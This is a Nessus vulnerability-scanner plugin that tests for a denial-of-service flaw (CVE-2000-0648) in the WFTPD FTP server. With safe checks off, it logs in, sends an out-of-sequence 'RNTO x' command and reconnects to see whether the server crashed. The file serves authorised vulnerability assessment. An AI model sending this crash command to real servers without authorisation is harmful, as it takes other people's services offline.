#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if(description)
{
 script_id(10466);
 script_bugtraq_id(1456);
 script_cve_id("CVE-2000-0648");
 script_xref(name:"OSVDB", value:"365");
 script_version ("$Revision: 1.26 $");
 
 script_name(english:"WFTPD Out of Sequence RNTO Command Remote DoS");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote server is vulnerable to a denial of service." );
 script_set_attribute(attribute:"description", value:
"The remote FTP server crashes when the command 'RNTO x' is issued right
after the login.

An attacker may use this flaw to prevent you from publishing anything
using FTP." );
 script_set_attribute(attribute:"solution", value:
"If you are using wftp, then upgrade to version 2.41 RC11, if you are 
not, then contact your vendor for a fix." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P" );



script_end_attributes();

 script_summary(english: "Crashes the remote FTP server");
 
 script_category(ACT_MIXED_ATTACK); # mixed
 
 script_copyright(english:"This script is Copyright (C) 2000-2009 Tenable Network Security, Inc.");
 script_family(english:"FTP");
 script_dependencie("find_service1.nasl", "ftp_anonymous.nasl", "ftpserver_detect_type_nd_version.nasl");
 script_require_ports("Services/ftp", 21);
 script_require_keys("ftp/login");
 exit(0);
}

#
# The script code starts here
#
include("global_settings.inc");
include("ftp_func.inc");

port = get_kb_item("Services/ftp");
if(!port)port = 21;
if(!get_port_state(port)) exit(0);

if (get_kb_item('ftp/'+port+'/broken') || get_kb_item('ftp/'+port+'/backdoor'))
  exit(0);

if(safe_checks())
{
 banner = get_ftp_banner(port: port);
 if("WFTP" >< banner)
 {
 txt = "
Nessus reports this vulnerability using only information that was 
gathered. Use caution when testing without safe checks enabled.";
 security_warning(port:port, extra: txt);
 }
 exit(0);
}

 if (report_paranoia < 2) exit(0);

 login = get_kb_item("ftp/login");
 pass  = get_kb_item("ftp/password");
 soc = open_sock_tcp(port);
 if(soc)
 {
  if(login)
  {
  if(ftp_authenticate(socket:soc, user:login, pass:pass))
   {
    req = string("RNTO x\r\n");
    send(socket:soc, data:req);
    ftp_close(socket:soc);
    soc2 = open_sock_tcp(port);
    if ( ! soc2 ) exit(0);
    r = ftp_recv_line(socket:soc2);
    ftp_close(socket: soc2);
    if(!r)security_warning(port);
    exit(0);
   }
  else
    {
     close(soc);
     soc = open_sock_tcp(port);
     if (! soc ) exit(0);
    }   
  }
  
  r = ftp_recv_line(socket:soc);
  ftp_close(socket: soc);
  if("WFTPD 2.4 service" >< r)
  {
   txt = string(
  "The remote FTP server *may* be vulnerable to a denial of\n",
 "service attack, but we could not check for it, as we could not\n",
 "log into this server.\n",
 "Make sure you are running WFTPd 2.41 RC11 or an attacker with a login\n",
 "and a password may shut down this server\n");
  security_warning(port:port, extra: txt);
  }
 }

